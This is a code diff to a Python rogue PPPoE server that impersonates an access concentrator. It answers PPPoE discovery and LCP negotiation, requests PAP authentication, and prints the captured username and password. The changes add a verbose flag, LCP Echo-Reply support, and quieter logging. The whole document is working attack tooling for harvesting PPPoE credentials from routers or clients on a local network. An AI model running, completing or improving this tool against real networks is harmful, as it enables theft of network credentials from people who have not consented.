@@ -33,6 +33,9 @@ LCP_TERM_REQ = 5         # Termination Request
 LCP_OPT_MRU = 1          # Maximum Receive Unit
 LCP_OPT_AUTH = 2         # Authentication Protocol
 LCP_OPT_MAGIC = 3        # Magic Number
+LCP_ECHO_REQ = 9         # Echo-Request
+LCP_ECHO_REPLY = 10
+
 
 # PAP Codes
 PAP_AUTH_REQ = 1         # Authentication Request
@@ -52,6 +55,11 @@ def parse_args():
         "-i", "--interface",
         default="eth0",
         help="Network interface to listen on"
+    )
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        help="Enable verbose output"
     )
     return parser.parse_args()
 
@@ -157,7 +165,8 @@ class PPPoEServer:
 
     def handle_padi(self, src_mac, tags):
         """Respond to PADI (PPPoE Active Discovery Initiation)."""
-        print(f"[+] Received PADI from {src_mac.hex(':')}")
+        if args.verbose:
+            print(f"[+] Received PADI from {src_mac.hex(':')}")
 
         # Check for Host-Uniq tag (used to match PADI-PADO-PADR)
         host_uniq = tags.get(0x0103, None)
@@ -184,11 +193,14 @@ class PPPoEServer:
         )
 
         self.sock.send(eth_frame)
-        print(f"[+] Sent PADO to {src_mac.hex(':')}")
+
+        if args.verbose:
+            print(f"[+] Sent PADO to {src_mac.hex(':')}")
 
     def handle_padr(self, src_mac, tags):
         """Handle PADR (Request)."""
-        print(f"[+] Received PADR from {src_mac.hex(':')}")
+        if args.verbose:
+            print(f"[+] Received PADR from {src_mac.hex(':')}")
 
         # Generate session ID
         session_id = random.randint(1, 65535)
@@ -219,7 +231,8 @@ class PPPoEServer:
             pppoe_header + tag_data
         )
         self.sock.send(eth_frame)
-        print(f"[+] Sent PADS (Session ID: {session_id})")
+        if args.verbose:
+            print(f"[+] Sent PADS (Session ID: {session_id})")
 
 
     def send_lcp_conf_req(self, session_id, dst_mac):
@@ -254,8 +267,8 @@ class PPPoEServer:
         )
 
         self.sock.send(eth_frame)
-        print(f"[+] Sent LCP Configuration-Request (Session: {session_id})")
-        print(f"    Magic Number: 0x{self.magic_number:08x}")
+        if args.verbose:
+            print(f"[+] Sent LCP Configuration-Request (Session: {session_id})")
 
     def handle_lcp(self, session_id, lcp_data, src_mac):
         """Handle LCP packets with full option parsing."""
@@ -268,8 +281,9 @@ class PPPoEServer:
         options = lcp_data[4:length] if length > 4 else b''
 
         if code == LCP_CONF_REQ:
-            print(f"[+] Received LCP Configuration-Request (ID: {identifier}, Session: {session_id})")
-            
+            if args.verbose:
+                print(f"[+] Received LCP Configuration-Request (ID: {identifier}, Session: {session_id})")
+
             # Parse all LCP options
             pos = 0
             while pos < len(options):
@@ -284,16 +298,17 @@ class PPPoEServer:
                     # Process specific option types
                     if opt_type == LCP_OPT_MRU:
                         mru = struct.unpack("!H", opt_data[:2])[0]
-                        print(f"    MRU: {mru} bytes")
-                        
+                        if args.verbose:
+                            print(f"    MRU: {mru} bytes")
+
                     elif opt_type == LCP_OPT_AUTH:
                         auth_proto = struct.unpack("!H", opt_data[:2])[0]
                         proto_name = "PAP" if auth_proto == 0xC023 else "CHAP" if auth_proto == 0xC223 else f"Unknown (0x{auth_proto:04x})"
-                        print(f"    Authentication Protocol: {proto_name}")
-                        
+                        if args.verbose:
+                            print(f"    Authentication Protocol: {proto_name}")
+
                     elif opt_type == LCP_OPT_MAGIC:
                         magic = struct.unpack("!I", opt_data[:4])[0]
-                        print(f"    Magic Number: 0x{magic:08x}")
                         # Store magic number for session
                         if session_id not in self.sessions:
                             self.sessions[session_id] = {}
@@ -311,11 +326,18 @@ class PPPoEServer:
             self.send_lcp_conf_req(session_id, src_mac)
 
         elif code == LCP_CONF_ACK:
-            print(f"[+] Received LCP Configuration-Ack (ID: {identifier}, Session: {session_id})")
+            if args.verbose:
+                print(f"[+] Received LCP Configuration-Ack (ID: {identifier}, Session: {session_id})")
 
         elif code == LCP_CONF_NAK:
-            print(f"[+] Received LCP Configuration-Nak (ID: {identifier}, Session: {session_id})")
+            if args.verbose:
+                print(f"[+] Received LCP Configuration-Nak (ID: {identifier}, Session: {session_id})")
             # Handle NAK (typically resend config with adjusted parameters)
+        elif code == LCP_ECHO_REQ:
+            if args.verbose:
+                print(f"[+] Received LCP Echo-Request (ID: {identifier}, Session: {session_id})")
+            # Respond with Echo-Reply
+            self.send_lcp_echo_reply(session_id, identifier, src_mac)
 
         # elif code == LCP_CONF_REJ:
         #     print(f"[+] Received LCP Configuration-Reject (ID: {identifier}, Session: {session_id})")
@@ -326,7 +348,8 @@ class PPPoEServer:
         #     self.send_lcp_echo_reply(session_id, identifier, options, src_mac)
 
         else:
-            print(f"[!] Unknown LCP code {code} (Session: {session_id})")
+            if args.verbose:
+                print(f"[!] Unknown LCP code {code} (Session: {session_id})")
 
     def send_lcp_conf_ack(self, session_id, identifier, options, dst_mac):
         """Send LCP Configuration-Acknowledgment packet.
@@ -368,12 +391,43 @@ class PPPoEServer:
         self.sock.send(eth_frame)
         
         # Debug output
-        if session_id in self.sessions and 'peer_magic' in self.sessions[session_id]:
-            magic = self.sessions[session_id]['peer_magic']
+        if args.verbose and session_id in self.sessions:
             print(f"[+] Sent LCP Config-Ack (ID: {identifier}, Session: {session_id})")
-            print(f"    Acknowledged Magic: 0x{magic:08x}")
-        else:
-            print(f"[+] Sent LCP Config-Ack (ID: {identifier}, Session: {session_id})")
+
+    def send_lcp_echo_reply(self, session_id, identifier, dst_mac):
+        """Send LCP Echo-Reply packet.
+
+        Args:
+            session_id: PPPoE session ID
+            identifier: LCP packet identifier (must match Request)
+            dst_mac: Destination MAC address
+        """
+        # Build LCP Echo-Reply header (code, id, length)
+        lcp_header = struct.pack("!BBH", LCP_ECHO_REPLY, identifier, 8)
+
+        # Build PPP frame (protocol 0xC021 for LCP)
+        ppp_frame = struct.pack("!H", PPP_LCP) + lcp_header + struct.pack("!I", self.magic_number)
+
+        # Build PPPoE header
+        pppoe_header = struct.pack("!BBHH",
+                                    PPPOE_VER_TYPE,  # ver_type
+                                    0x00,           # code (session data)
+                                    session_id,     # session ID
+                                    len(ppp_frame)) # length
+
+        # Build complete Ethernet frame
+        eth_frame = (
+            dst_mac +                   # Destination MAC (client)
+            self.mac +                  # Source MAC (server)
+            struct.pack("!H", ETH_PPPOE_SESS) +  # EtherType
+            pppoe_header +              # PPPoE header
+            ppp_frame                   # PPP/LCP payload
+        )
+
+        # Send packet
+        self.sock.send(eth_frame)
+        if args.verbose:
+            print("[+] Sent LCP Echo-Reply")
 
     def handle_pap(self, session_id, pap_data, src_mac):
         """Handle PAP authentication."""
@@ -385,8 +439,7 @@ class PPPoEServer:
                 passwd_len = pap_data[5+peer_id_len]
                 password = pap_data[6+peer_id_len:6+peer_id_len+passwd_len].decode("ascii", errors="ignore")
 
-                print("\n[!] Captured PAP Credentials:")
-                print(f"    Session ID: {session_id}")
+                print("\n[!] Captured PPPoE Credentials:")
                 print(f"    Username:   {peer_id}")
                 print(f"    Password:   {password}\n")
 
@@ -403,7 +456,8 @@ class PPPoEServer:
                 )
                 
                 self.sock.send(eth_frame)
-                print("[+] Sent PAP ACK")
+                if args.verbose:
+                    print("[+] Sent PAP ACK")
                 sys.exit(0)
 
         except Exception as e:
